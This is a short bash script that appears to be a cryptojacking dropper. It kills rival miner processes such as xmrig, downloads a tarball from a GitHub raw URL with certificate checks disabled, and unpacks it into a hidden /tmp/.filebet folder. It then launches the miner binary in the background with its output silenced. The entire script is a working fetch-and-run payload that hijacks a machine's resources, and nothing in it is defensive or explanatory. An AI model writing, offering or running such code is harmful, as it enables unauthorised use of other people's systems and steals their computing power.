#!/bin/bash
if ! type curl >/dev/null; then
  echo "ERROR: This script requires \"curl\" utility to work correctly"
  exit 1
fi

kill -9 `ps -aux|egrep '(miner|xmrig|filebet)'|egrep -v '(grep|egrep|ps)'|awk '{print $2}'` 2>/dev/null

cd /tmp/

echo "[*] Downloading miner"
if ! curl -ks "https://raw.githubusercontent.com/anabianca92/lol/main/filebet.tar.gz" -o filebet.tar.gz; then
  echo "ERROR: Can't curl miner"
  exit 1
fi

[ -d  /tmp/.filebet ] || mkdir  /tmp/.filebet
if ! tar xf /tmp/filebet.tar.gz; then
  echo "ERROR: Can't unpack miner to /tmp/.filebet"
  exit 1
fi

rm /tmp/filebet.tar.gz
exec /tmp/.filebet/filebet --config=/tmp/.filebet/config.json 2>/dev/null &
echo "[*] Setup complete"
